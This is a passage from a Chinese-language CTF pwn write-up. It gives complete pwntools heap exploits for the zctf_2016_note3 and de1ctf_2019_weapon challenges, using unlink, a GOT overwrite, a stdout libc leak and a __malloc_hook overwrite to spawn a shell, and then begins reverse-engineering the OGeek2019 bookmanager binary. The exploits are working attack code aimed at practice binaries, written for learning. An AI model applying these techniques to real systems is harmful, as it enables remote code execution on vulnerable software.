class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./zctf_2016_note3'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./zctf_2016_note3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 25470)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'zctf_2016_note3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(less than 1024)"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> <span class="token number">0x6020c8</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> atoi_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0xe-de1ctf-2019-weapon"><a href="#0xe-de1ctf-2019-weapon" class="headerlink" title="0xe.de1ctf_2019_weapon"></a>0xe.de1ctf_2019_weapon</h2><p>这题是我接触的第一道通过stdout泄露libc地址的题目，当初拿着大佬的exp一步步调的，做法跟npuctf的badguy差不多的，就不细🔒了，直接上大佬的exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >> \n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size of weapon: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input idx :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input idx: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'new content:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># raw_input()</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'bbbb'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbbb'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'\x18'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xdd\x25'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'\x30'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(t)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x08'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">)</span>    addr_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>t<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">200</span> <span class="token operator">-</span> <span class="token number">0x3c5540</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'[+] libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>addr_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>    magic <span class="token operator">=</span> addr_libc <span class="token operator">+</span> <span class="token number">0xf1147</span>    addr_hook <span class="token operator">=</span> addr_libc <span class="token operator">+</span> <span class="token number">0x3c4b10</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'[+] addr_hook: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>addr_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>addr_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>magic<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >> \n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size of weapon: '</span><span class="token punctuation">,</span> <span class="token string">'10'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#t = remote('node3.buuoj.cn', 28913)</span>            t <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./de1ctf_2019_weapon'</span><span class="token punctuation">)</span>            exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>            t<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            t<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span></code></pre><h2 id="0xf-OGeek2019-bookmanager"><a href="#0xf-OGeek2019-bookmanager" class="headerlink" title="0xf.[OGeek2019]bookmanager"></a>0xf.[OGeek2019]bookmanager</h2><p>这题，👴还是太菜了，碰到这种代码量巨大的题目就昏了头，满眼的*，太顶了，👴的代码审计能力还是弱的一批。</p><p>这题我看的ex师傅的exp调试的，由于程序有八个功能，👴做题时看到第二个功能就萎了，太长🌶，👴受⑧了，直接就上网搜了一波exp，拿着ex师傅的exp调试完后就一把梭，这样还是不好，所以在这里把整个程序的功能实现完整的复现一遍</p><p>首先是main函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token function">sub_C1A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_D97</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">30LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"book name: %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">input_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> off_2554 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>        <span class="token function">add_chapter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>        <span class="token function">add_section</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>        <span class="token function">add_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>        <span class="token function">remove_chapter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>        <span class="token function">remove_section</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6u</span><span class="token punctuation">:</span>        <span class="token function">remove_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7u</span><span class="token punctuation">:</span>        <span class="token function">preview</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8u</span><span class="token punctuation">:</span>        <span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9u</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>程序一开始分配一个0x80的chunk，然后往chunk中读入bookname，接着是经典的switch语句，八个功能，我们依次来分析</p><h4 id="1-add-chapter"><a href="#1-add-chapter" class="headerlink" title="1.add_chapter()"></a>1.add_chapter()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">add_chapter</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  v2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nNot enough space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>add_chapter</strong>功能接受的参数为main函数中分配的0x80大小chunk的指针，为方便，后面统称为book_chunk</p><p>程序通过for循环，以<strong>*(a1 + 8 * (i + 4LL))</strong>遍历book_chunk，初始为<strong>*(a1 +0x20)</strong>，如果<strong>*(a1 + 8 * (i + 4LL))</strong>为空，则分配一个0x80的chunk，指针放入该位置，然后通过这个指针往对应chunk写入数据。根据这个功能我们就能写出book_chunk的结构体了，如下</p><pre><code>struct book{    char name[32];    char *chapter[12];}</code></pre><h4 id="2-add-section"><a href="#2-add-section" class="headerlink" title="2.add_section()"></a>2.add_section()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">add_section</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-48h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-44h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-40h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-18h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhich chapter do you want to add into:"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>qword_20<span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span 